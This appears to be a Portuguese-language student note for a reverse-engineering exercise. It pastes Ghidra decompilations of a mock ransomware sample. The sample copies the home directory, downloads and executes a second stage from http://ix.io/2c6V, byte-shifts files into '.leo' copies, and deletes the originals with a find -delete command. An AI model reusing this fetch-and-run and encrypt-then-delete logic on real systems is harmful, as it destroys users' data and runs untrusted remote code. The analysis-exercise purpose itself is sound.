@@ -1,0 +1,182 @@
+Não consegui avançar no trabalho pois houveram alguns problemas, inicialmente o arquivo tag n rodava por falta de permissão, dei um chmod +x tag e assim consegui rodar, mas n acontece nada, não cria nenhum arquivo encriptado, até criei arquivo novo na home pra ver se rolava e nada, então baixei o arquivo 2c6V pelo link que a Mari jogou no grupo do telegram, eu baixei o ghidra e peguei esses codigos abaixo
+
+
+Codigos :
+
+size_t write_data(void *param_1,size_t param_2,size_t param_3,FILE *param_4)
+
+{
+  size_t sVar1;
+  
+  sVar1 = fwrite(param_1,param_2,param_3,param_4);
+  return sVar1;
+}
+
+void download_file_from_url(undefined8 param_1,char *param_2)
+
+{
+  long lVar1;
+  FILE *__stream;
+  
+  lVar1 = curl_easy_init();
+  if (lVar1 != 0) {
+    __stream = fopen(param_2,"wb");
+    curl_easy_setopt(lVar1,0x2712,param_1,0x2712);
+    curl_easy_setopt(lVar1,0x4e2b,write_data,0x4e2b);
+    curl_easy_setopt(lVar1,0x2711,__stream,0x2711);
+    curl_easy_perform(lVar1);
+    curl_easy_cleanup(lVar1);
+    fclose(__stream);
+  }
+  return;
+}
+
+
+void printa_ascii_art(void)
+
+{
+  printf("%s",banner);
+  return;
+}
+
+
+void encripta_arquivos(void)
+
+{
+  time_t tVar1;
+  
+  tVar1 = time((time_t *)0x0);
+  srand((uint)tVar1);
+  rand();
+  return;
+}
+
+ulong _system_integrity_check(void)
+
+{
+  uint uVar1;
+  int iVar2;
+  FILE *__stream;
+  
+  iVar2 = rand();
+  uVar1 = iVar2 % 5 + 1;
+  __stream = fopen("/tmp/key","w+");
+  fprintf(__stream,"%d\n",(ulong)uVar1);
+  fclose(__stream);
+  return (ulong)uVar1;
+}
+
+
+void _system_loader_callback(undefined8 param_1,uint param_2)
+
+{
+  long in_FS_OFFSET;
+  char local_98 [136];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  download_file_from_url(param_1,".encriptador",".encriptador");
+  sprintf(local_98,"%s %d\n","chmod u+x .encriptador && ./.encriptador",(ulong)param_2);
+  system(local_98);
+  sleep(2);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+
+
+
+undefined8 main(void)
+
+{
+  uint uVar1;
+  
+  puts("Olá!");
+  system("mkdir -p $USER && cp ~/* $USER 2> /dev/null");
+  puts("Codificando os arquivos da sua home...");
+  puts("Procure por uma forma de descodificá-los");
+  puts("OBS: Não desligue sua máquina, se não não será mais possível recuperar os dados!!!");
+  sleep(1);
+  encripta_arquivos();
+  printa_ascii_art();
+  uVar1 = _system_integrity_check();
+  _system_loader_callback("http://ix.io/2c6V",(ulong)uVar1);
+  puts(
+      "brincadeira, fiz uma cópia da sua home no diretório atual e encriptei seus arquivos lá, rs"
+      );
+  return 0;
+}
+}
+
+
+////////////////////
+
+undefined8 main(int param_1,undefined8 *param_2)
+
+{
+  int iVar1;
+  int iVar2;
+  char *__name;
+  undefined8 uVar3;
+  DIR *__dirp;
+  int *piVar4;
+  FILE *__stream;
+  FILE *__stream_00;
+  dirent *pdVar5;
+  long in_FS_OFFSET;
+  char local_418 [512];
+  char local_218 [520];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  __name = getenv("USER");
+  if (param_1 < 2) {
+    printf("usage: ./%s <argument>",*param_2);
+    uVar3 = 1;
+  }
+  else {
+    iVar1 = atoi((char *)param_2[1]);
+    __dirp = opendir(__name);
+    if (__dirp == (DIR *)0x0) {
+      piVar4 = __errno_location();
+      __name = strerror(*piVar4);
+      fprintf(stderr,"Error : Failed to open input directory - %s\n",__name);
+      uVar3 = 1;
+    }
+    else {
+      while (pdVar5 = readdir(__dirp), pdVar5 != (dirent *)0x0) {
+        iVar2 = strcmp(pdVar5->d_name,".");
+        if ((iVar2 != 0) && (iVar2 = strcmp(pdVar5->d_name,".."), iVar2 != 0)) {
+          sprintf(local_418,"%s/%s",__name,pdVar5->d_name);
+          __stream = fopen(local_418,"rw");
+          if (__stream == (FILE *)0x0) {
+            piVar4 = __errno_location();
+            __name = strerror(*piVar4);
+            fprintf(stderr,"Error : Failed to open %s - %s\n",local_418,__name);
+            uVar3 = 1;
+            goto LAB_001014b3;
+          }
+          sprintf(local_218,"%s.leo",local_418);
+          __stream_00 = fopen(local_218,"w");
+          while( true ) {
+            iVar2 = fgetc(__stream);
+            if ((char)iVar2 == -1) break;
+            fputc((char)iVar2 + iVar1,__stream_00);
+          }
+          fclose(__stream_00);
+          fclose(__stream);
+        }
+      }
+      system("find $USER -type f ! -name \'*.leo\' -delete");
+      uVar3 = 0;
+    }
+  }
+LAB_001014b3:
+  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
+    return uVar3;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+
